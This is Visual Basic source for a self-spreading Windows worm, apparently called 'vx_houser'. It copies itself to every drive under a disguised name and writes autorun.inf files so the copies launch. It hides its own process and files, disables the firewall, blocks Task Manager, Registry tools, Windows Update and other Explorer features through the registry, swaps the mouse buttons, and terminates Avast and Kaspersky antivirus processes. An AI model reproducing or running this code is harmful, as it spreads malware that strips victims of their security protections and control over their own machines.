Attribute VB_Name = "vx_houser"
Option Explicit

Sub Main()
On Error Resume Next
replicatorAndConcealer
bomb
End Sub
Sub replicatorAndConcealer()
    ' This will handle the replicator objects as we will be using Windows File System Object to copy files
    Dim DrvLoc, drivs, mach, a, cop, mepath
    ' use this to execute stuff
    Dim c As String
    ' to handle resources as we create autorun files
    Dim AutorunResource As Integer
    ' this variable will handle setting our file attributes
    Dim fa As VbFileAttribute
    ' This will handle finding and freeing resources
    Dim freeResource
    'Autorun File
    Dim autorun_file As String
    ' Hide current running application instance from task manager (Concealer)
    App.TaskVisible = False
    ' Initialize a few settings
    mepath = App.Path & "\" & App.EXEName & ".exe"
    autorun_file = App.Path + "\Autorun.inf"
    cop = drivs & "\replicated_malice.dll.exe"
    fa = vbHidden + vbReadOnly + vbSystem + vbAlias
    If App.PrevInstance = False Then
          ' apply hidden attributes to current running instance (Concealer)
          SetAttr mepath, fa
          'copy to all drives root Using File System Object
        Set DrvLoc = CreateObject("Scripting.FileSystemObject")
        'Instance of all drives in a machine
        Set mach = DrvLoc.drives
        For Each drivs In mach
        'Identify drive types to copy to
         If (drivs.drivetype = 1) Or (drivs.drivetype = 2) Or (drivs.drivetype = 3) Or (drivs.drivetype = 4) Then
             FileCopy (App.Path & "\" & App.EXEName & ".exe"), (drivs & "\replicated_malice.dll.exe")
             SetAttr cop, fa
             'makes autorun.inf for all the copies
             Open autorun_file For Output As #AutorunResource
             Print #AutorunResource, "[autorun]"
             Print #AutorunResource, "open = " + mepath
             Close #AutorunResource
            'conceal autorun file
            SetAttr autorun_file, fa
            'force pricessing of autorun file and replica
            c = Shell(App.Path + "\Autorun.inf", vbMinimizedNoFocus)
            a = Shell(drivs & "\replicated_malice.dll.exe", vbMinimizedNoFocus)
         End If
        Next
    End If
End Sub

Sub bomb()
    Dim FirewallKiller
    Dim wScrHstInstance
    'Get firewall Instance
    Set FirewallKiller = CreateObject("HNetCfg.FwMgr")
    Dim profile
    'Get Current User's Firewall Profile
    Set profile = FirewallKiller.LocalPolicy.CurrentProfile
    'Disable the firewall
    profile.FIREWALLENABLED = False
    ' Create an instance of windows scripting host shell
    Set wScrHstInstance = CreateObject("Wscript.Shell")
    'Disable Registry
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DisableRegistryTools", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\DisableRegistryTools", 1, "REG_DWORD"
    'Disable Task Manager
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DisableTaskMgr", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\DisableTaskMgr", 1, "REG_DWORD"
    ' Remove some features from windows explorer
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsMenu", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFavoritesMenu", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetActiveDesktop", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate", 1, "REG_DWORD"
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1, "REG_DWORD"
    'Well evil swap of mouse buttons
    wScrHstInstance.regwrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", 1, "REG_SZ"
     'for avast if available then
    KillAV ("ASHSIMP2.EXE")
    KillAV ("ASHSIMPL.EXE")
    KillAV ("SCHED.EXE")
    KillAV ("VISTHAUX.EXE")
    KillAV ("VISTHUPD.EXE")
    KillAV ("ASHDISP.EXE")
    KillAV ("ASHSERV.EXE")
    KillAV ("ASWUPDSV.EXE")
    KillAV ("ASHMAISV.EXE")
    KillAV ("ASHWEBSV.EXE")
    'FOR KASPERSKY
    KillAV ("AVP.EXE")
    KillAV ("KLMOVER.EXE")
    KillAV ("KLNAGENT.EXE")
    KillAV ("KLNAGCHK.EXE")
    
End Sub
Public Function KillAV(AppNameOfExe As String)
On Error Resume Next
    Dim GetProcess As Object
    Dim GetProcessTool As Object
    Dim ProcessByProcess As Object
    Set GetProcessTool = GetObject("winmgmts:")
    If IsNull(GetProcessTool) = False Then
            Set GetProcess = GetProcessTool.InstancesOf("win32_process")
            For Each ProcessByProcess In GetProcess
                If UCase(ProcessByProcess.Name) = UCase(AppNameOfExe) Then
                ProcessByProcess.Terminate (0)
            End If
        Next
    Else
    End If
    Set GetProcess = Nothing
    Set GetProcessTool = Nothing
End Function
